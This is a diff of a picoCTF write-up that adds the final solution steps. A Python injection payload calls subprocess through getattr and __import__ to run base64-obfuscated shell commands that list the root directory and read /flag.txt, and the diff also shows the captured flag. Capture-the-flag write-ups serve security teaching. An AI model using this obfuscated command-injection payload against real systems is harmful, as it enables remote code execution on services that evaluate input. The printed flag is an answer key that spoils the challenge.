@@ -32,5 +32,13 @@ From here, we can read the flag. Remember, encode first, then decode and execute
 getattr(__import__('subprocess'), 'getoutput')('file_path=$(echo "bHMgLw==" | base64 --decode); $file_path')
 ```
 
+Output: `Result: app bin boot challenge dev etc flag.txt home lib lib32 lib64 libx32 media mnt opt proc root run sbin srv sys tmp usr var`
+
+```py
+getattr(__import__('subprocess'), 'getoutput')('file_path=$(echo "Y2F0IC9mbGFnLnR4dA==" | base64 --decode); $file_path')
+```
+
+and you will get the flag.
+
 ## Flag
     picoCTF{D0nt_Use_Unsecure_f@nctions0cd8a9f1}
